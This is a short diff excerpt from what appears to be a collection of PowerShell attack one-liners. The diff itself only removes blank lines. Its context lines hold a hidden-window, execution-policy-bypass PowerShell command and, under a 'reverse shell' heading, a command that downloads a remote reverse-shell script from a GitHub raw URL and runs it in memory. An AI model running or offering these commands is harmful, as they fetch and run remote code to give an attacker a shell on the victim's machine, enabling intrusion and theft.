@@ -21,9 +21,6 @@ powershell -windowstyle hidden -NoLogo -NonInteractive -ep bypass -nop -c "IEX (
 
 
 
-
-
-
 ---------Tcp_Nishan_reverse shell------------
 powershell -windowstyle hidden "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/vulware/powershell-reverse-shell-/master/powershell%20tcp%20reverse%20shell.ps1');"
 
